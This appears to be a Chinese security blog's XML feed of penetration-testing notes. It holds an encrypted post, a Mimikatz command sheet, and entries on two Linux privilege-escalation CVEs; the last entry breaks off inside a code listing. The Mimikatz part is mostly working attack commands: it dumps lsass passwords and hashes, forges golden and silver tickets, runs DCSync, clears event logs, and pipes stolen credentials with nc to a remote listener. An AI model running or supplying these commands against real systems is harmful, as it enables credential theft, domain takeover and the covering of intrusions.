3ceb9c2795a81cbabe1e130a17124e5aca2c7765ed9ca1c3b3df6f2e5cf695f54b94f628382f84b5962319dda1d015ece43fa653fdbf36ccdea0bf5b26ff9fcdd92d019b8f1f9bf87ad0482ba0ef01bea6349f34afa940bbc9eec707c7dbcadd661aff493039cfc6bc13963b1a34b6bc46653e6df37c2bd1145a8c7e5cd9261f9b81a5ecf3a4af0bf971a6fe1383d32a762deae971095bd4f9ecd126d8e1d1dfbfd36d7069a67eb2cd837c04f3fd220b30ff6bd7369c5585d0730c1ab230a3cce8b4dab863d9ab344c226830e81136c483fcdc28e930d91f03a8fc9b82f43b9b78fa2f09a1589bfb7a3b9766de05d949004f91f0855ca9a692e532afff6e35a7522a8cb92b09e1c58ff7d13a96f1efa7603138567f09a85aabd8ff6429800cb006097b0a9ae32b9a6286ac98f4372a0d55681fb768e87b01a5bdfa7031f5b02ce3dbeb98e96c5cc0ba61e828350aaa0c3ed365dc20363ae0eda7b6da576bd7c68eac2241ccf1bdbe4f8e42cea2ed3e43aafd7263ad992ce2f0e24295d0e996a4bc5ce51219e23f9b688ab586dfaf242adf64b542a581af795ac5c42ea0c394319a5e69422c4a2f41435f6394bf7ee4fa46e3aa3beaa4cb7482c0052a7b4ec4f3dce2420354effc3c9493e1f526a57fb0e1e16e26389b3e71e4fa406606984e2f18fc9b160b5904982ebfceccfadbd951f48d1ceee2133ea2d05c25bf97f608e931eb13ebae0f56369a127eb4ad7a96016827ca036e522446b12239efad09e4f11973283248fea853fd91eb2a33ff1f4bac6fd4ab42ed98951308b44c0c4144db87ddfcb2c142af838628457d1195a0b356eabc49bbc724c92bcf2f0063c94ba0a5d2593076fac7aa2246dd2cd583182a9a7f25639ca8b44cb7e1b985a13c484c18e6e6725e8c8bbbfefd78e738027b9c04794768b9a8191fcf2da5531b17905b0953bbca632ad79371ea775d0bfb87e7747416f464d1d9c1e5e8dc964ed58616b8cec8a22edf0c2a9b3256f5a797c2fd35c7c2f353c839c11d62a7670140047298a12a564537d620b48d898bb1164f57826b8b5f0391c732eb0a68eb647e59a576f17f4342756af2f091f6b39ac1c2701affbb04c699ac2cc145192a074089592c2643847c7a5d6733076565f6d880fe343560d56809453955099fd39bb7c53b18a8f3be182e4562bbc38595341cd72365a8f7e7e5aed0d27dd3c509c0108fc86c3ffb1933704d2321ff470cb8a4b1993b4c53e9169d3e3f904cfefa7a71641d6e134dcbcf7a10d36dfc54d787acf9c4552f4c09c559853862dbd5dfd49d2a1d84c342c888564fe7cac7c86dcc9685d350beea6d0f9efb539b76f68271b167b5cc9f268f856322ef0b32c864b17c9d09c8ba3653d3daa1d755c51869bec701042e742b453aaa69bba3ad3bf01e8e6fb9b836b3581d6263f9a8290e785ea3be8e624bb3bc170378017e4d0a9a9980dc9c5d504b12c878d1e4e7c8b4e25788f8e1726f35db322714fe21c0ef24aa1dc6cf1fe15b3b8b46423197259d7a4b9b4028463559e82b5b0a981734ca1c4f3fe87edd96d1975a046e6efe26a9c9d9e35251152618e58cfe66944dc6b0fdf41e5beccb4a22fc62c8e2630fa3e7cbdd0b99a8579a61f971b05907fc3d390fef6aed302220bd60062c13f1c69ed436f6217b28d05553c8f5128d34e4bd98adf80ff3a6dc7f38af298dde2a5c76209190085da9da5db64f54a59b67cd59dff96ee6bde1e4e3d6c3488adf23db96f3f4faa62b802a2d959d74aeb4693654db56b4bc8230ae965feabc9718a0e2d22c22a849fbe0415f69e5792db52417ad15d0e823ba7f3ec947f4eaf79c0466a4dca3c4b847b9b5d28a1255bcf1d6d7915d8c70021e7e74e68dac12ee98e497e7b05a1b5c9d2b3ce77443e8fde15cde8b57e2d4615772a4af0bedcd98b1d8371dad6e4cff12f8d8c9fa4ce64bb4c7acbe73b82a781caba582be0a1813054f09c4f9f06011f8924b30a35e40aac76eeb72787020b288f7ad9f6a9c0734a37df9ce5adaa9fc4a2864a5e351a5d0c428e890c49a48a9f98a11b161d148385f7b296a149b5fca7e93813f362fe221afb69cf59483bca72a94b072976eae8e5826f1c4decdbc3f9ac2e162d4bf85824b8c489ec74564c5b2f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mimikatz</title>
      <link href="/p/b76dfd1e.html"/>
      <url>/p/b76dfd1e.html</url>
      
        <content type="html"><![CDATA[<p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统。<a href="https://github.com/gentilkiwi/mimikatz">GitHub地址</a></p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure><blockquote><p>mimikatz 很多功能的使用需要管理员权限，也就是需要本地的 administrator 权限或者域内的管理员组内权限。如果是工作组环境，则必须得是 administrator 用户，而不能是管理员组内的用户。如果是域环境，则只要是域管理员组内用户即可。</p></blockquote><h2 id="命令提示"><a href="#命令提示" class="headerlink" title="命令提示"></a>命令提示</h2><p>输入<code>[错误的模块名]::</code>得到模块列表</p><p>输入<code>[正确的模块名]::</code>得到模块对应参数</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>cls</td><td>清屏</td></tr><tr><td>exit</td><td>退出</td></tr><tr><td>version</td><td>查看版本</td></tr><tr><td>log</td><td>添加日志，<code>mimikatz.log</code>到当前目录</td></tr></tbody></table><h2 id="sekurlsa模块-枚举用户凭证"><a href="#sekurlsa模块-枚举用户凭证" class="headerlink" title="sekurlsa模块-枚举用户凭证"></a>sekurlsa模块-枚举用户凭证</h2><p>抓取系统明文密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>抓取用户NTLM哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::msv</span><br></pre></td></tr></table></figure><blockquote><p>使用Hashcat进行破解</p></blockquote><p>导出lsass.exe进程中所有的票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>将密码信息传回攻击机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit | nc -v 192.168.88.132 2333</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210916113947879.png" alt="image-20210916113947879"></p><blockquote><p>无法使用 mimikatz 读取到明文密码是因为微软在 Win7 之后就打了补丁 KB2871997，当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass 进程）不再保存明文口令，mimikatz 就读不到密码明文，但是该选项是可以手动开启：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><h2 id="kerberos模块"><a href="#kerberos模块" class="headerlink" title="kerberos模块"></a>kerberos模块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">列出系统中的票据</span><br><span class="line">kerberos::list</span><br><span class="line">kerberos::tgt</span><br><span class="line"> </span><br><span class="line">清除系统中的票据</span><br><span class="line">kerberos::purge</span><br><span class="line"> </span><br><span class="line">导入票据到系统中</span><br><span class="line">kerberos::ptc 票据路径</span><br><span class="line"> </span><br><span class="line">生成黄金票据并导入，利用krbtgt的NTLM哈希</span><br><span class="line">kerberos::golden /user:administrator /domain:xie.com /sid:S-1-5-21-2189311154-2766837956-1982445477 /krbtgt:7aad81625fab43e7fdb3cd9f399c060c /ptt</span><br><span class="line">kerberos::golden /user:要伪造的域用户(我们这一般写域管理员) /domain:域名 /sid:域的sid值 /krbtgt:krbtgt的哈希 /ptt</span><br><span class="line">生成黄金票据并导入，利用krbtgt的AES-256</span><br><span class="line">kerberos::golden /user:administrator /domain:xie.com /sid:S-1-5-21-2189311154-2766837956-1982445477 /aes256:93c335cce03858c917fa2ea98ca79f0b791c93c33ab17936784548114648cda7  /ptt</span><br><span class="line">kerberos::golden /user:要伪造的域用户(我们这一般写域管理员) /domain:域名 /sid:域的sid值 /aes256:krbtgt的AES256 /ptt</span><br><span class="line"> </span><br><span class="line">生成白银票据并导入</span><br><span class="line">kerberos::golden /domain:xie.com /sid:S-1-5-21-2189311154-2766837956-1982445477 /target:WIN2008.xie.com /service:cifs /rc4:290c699798b47b809500b3bbd4ed3e2f /user:administrator /ptt</span><br></pre></td></tr></table></figure><h2 id="lsadump模块"><a href="#lsadump模块" class="headerlink" title="lsadump模块"></a>lsadump模块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(在域控上执行)查看域xie.com内指定用户krbtgt的详细信息，包括NTLM哈希等</span><br><span class="line">lsadump::dcsync /domain:xie.com /user:krbtgt</span><br><span class="line"> </span><br><span class="line">(在域控上执行)读取指定域所有用户的哈希</span><br><span class="line">lsadump::dcsync /domain:beijing.xie.com  /all /csv </span><br><span class="line"> </span><br><span class="line">(在域控上执行)读取所有域用户的哈希</span><br><span class="line">lsadump::lsa /patch</span><br><span class="line"> </span><br><span class="line">从sam.hive和system.hive文件中获得NTLM Hash</span><br><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br><span class="line"> </span><br><span class="line">从本地SAM文件中读取密码哈希</span><br><span class="line">token::elevate </span><br></pre></td></tr></table></figure><h2 id="ProcDump-mimikatz"><a href="#ProcDump-mimikatz" class="headerlink" title="ProcDump + mimikatz"></a>ProcDump + mimikatz</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe <span class="literal">-accepteula</span> <span class="literal">-ma</span> lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210916135212663.png" alt="image-20210916135212663"></p><p>将生成的lsass.dmp放到和mimikatz相同的目录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接读取明文密码</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::tspkg&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取明文密码 + Hash值 信息更全</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><h2 id="操作日志"><a href="#操作日志" class="headerlink" title="操作日志"></a>操作日志</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210916150316356.png" alt="image-20210916150316356"></p><p>drop功能：patch events service 抓住这个事件服务防止它生成新的事件</p><p>clear：清除这个事件日志</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210916150347374.png" alt="image-20210916150347374"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html">https://www.cnblogs.com/-mo-/p/11890232.html</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/100634467">https://blog.csdn.net/qq_36119192/article/details/100634467</a></p><p><a href="https://franci4.github.io/uncategorized/Mimikatz.html">https://franci4.github.io/uncategorized/Mimikatz.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-16995</title>
      <link href="/p/47eeacbc.html"/>
      <url>/p/47eeacbc.html</url>
      
        <content type="html"><![CDATA[<p>CVE-2017-16995最初是由Google project zero披露，并公开了相关poc，在2017年12月23日，Bruce Leidl公布了<a href="https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c">提权代码</a>。在2018年3月中旬，Vitaly Nikolenko在推特上发布消息说Ubuntu 16.04存在高危漏洞，可以进行本地提权，同时公布了<a href="http://cyseclabs.com/exploits/upstream44.c">exp</a>。整个过程仅利用精心构造的数据就可以劫持控制流，是属于Data-Oriented Attacks在Linux kernel上的一个典型应用。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="https://x3h1n.github.io/2020/03/07/CVE-2017-16995%E5%A4%8D%E7%8E%B0/">https://x3h1n.github.io/2020/03/07/CVE-2017-16995%E5%A4%8D%E7%8E%B0/</a></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Ubuntu 16.04.1~Ubuntu 16.04.4均存在此漏洞；</p><p>仅影响 Ubuntu/Debian发行版本。</p><p>内核影响版本：Linux Kernel Version 4.14 ~ 4.4 </p><p>测试：4.4.0-81-generic</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="http://cyseclabs.com/exploits/upstream44.c">http://cyseclabs.com/exploits/upstream44.c</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210915135454316.png" alt="image-20210915135454316"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>方法一：通过修改内核参数限制普通用户使用<code>bpf(2)</code>系统调用来缓解：</p><p>设置参数<code>kernel.unprivileged_bpf_disabled = 1</code>通过限制对<code>bpf(2)</code>调用了访问来防止这种特权升级。</p><p>方法二：升级Linux Kernel 版本，需要重启服务器之后生效</p><p>方法三：使用官方补丁进行修复</p><p><a href="https://github.com/torvalds/linux/commit/95a762e2c8c942780948091f8f2a4f32fce1ac6f">https://github.com/torvalds/linux/commit/95a762e2c8c942780948091f8f2a4f32fce1ac6f</a></p><h2 id="日志特征"><a href="#日志特征" class="headerlink" title="日志特征"></a>日志特征</h2><p>auth.log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04.1~Ubuntu 16.04.4均存在此漏洞；</span><br><span class="line">仅影响 Ubuntu/Debian发行版本。</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210915140005391.png" alt="image-20210915140005391"></p>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-1000001</title>
      <link href="/p/2762ae73.html"/>
      <url>/p/2762ae73.html</url>
      
        <content type="html"><![CDATA[<p>libc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。</p><p>glibc 2.26版本及之前版本中的Realpath函数存在缓冲区下溢漏洞（CVE-2018-1000001）。GNU C库没有正确处理getcwd()系统调用返回的相对路径，并且没有对缓冲区边界进行检查，造成glibc缓冲区下溢漏洞。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞涉及到 Linux 内核的 getcwd 系统调用和 glibc 的 realpath() 函数，可以实现本地提权。漏洞产生的原因是 getcwd 系统调用在 Linux-2.6.36 版本发生的一些变化，我们知道 getcwd 用于返回当前工作目录的绝对路径，但如果当前目录不属于当前进程的根目录，即从当前根目录不能访问到该目录，如该进程使用 chroot() 设置了一个新的文件系统根目录，但没有将当前目录的根目录替换成新目录的时候，getcwd 会在返回的路径前加上 (unreachable)。通过改变当前目录到另一个挂载的用户空间，普通用户也可以完成这样的操作。然后返回的这个非绝对地址的字符串会在 realpath() 函数中发生缓冲区下溢，从而导致任意代码执行，再利用 SUID 程序即可获得目标系统上的 root 权限。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>glibc 2.26版本及之前版本</p><h2 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg --list | grep -i libc6</span><br></pre></td></tr></table></figure><blockquote><p>如果您的 libc6 软件包是：</p><ul><li>2.24-11+deb9u1 用于 Debian Stretch</li><li>2.23-0ubuntu9 用于 Ubuntu Xenial Xerus</li></ul><p>那么你可能很脆弱。</p></blockquote><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><table><thead><tr><th></th><th>使用环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>Ubuntu 16.04.3</td><td>64位</td></tr><tr><td>调试器</td><td>gdb-peda</td><td>7.11.1</td></tr><tr><td>漏洞软件</td><td>glibc</td><td>2.23-0ubuntu9</td></tr></tbody></table><p>exp里面，硬编码了一些数据在里面，如果系统符合才会进行执行，这就导致有些系统是不会成功的</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c">https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span 